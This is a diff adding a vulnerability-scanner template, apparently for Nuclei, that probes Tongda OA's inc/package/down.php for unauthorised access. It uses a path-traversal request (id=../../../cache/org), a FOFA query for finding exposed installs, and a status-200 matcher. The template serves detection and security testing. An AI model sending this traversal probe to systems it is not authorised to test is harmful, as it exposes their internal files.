@@ -1,0 +1,28 @@
+id: TongDa-18
+
+info:
+  name: 通达OA inc/package/down.php接口存在未授权访问漏洞
+  author: pussycat0x
+  severity: high
+  description: |
+    通达OA inc/package/down.php接口存在未授权访问漏洞
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="通达OA网络智能办公系统"
+  tags: TongDa,OA,未授权访问
+request:
+  - raw:
+      - |
+        GET /inc/package/down.php?id=../../../cache/org HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+        Host: {{RootURL}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: keep-alive
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status
+        status: 
+          - 200
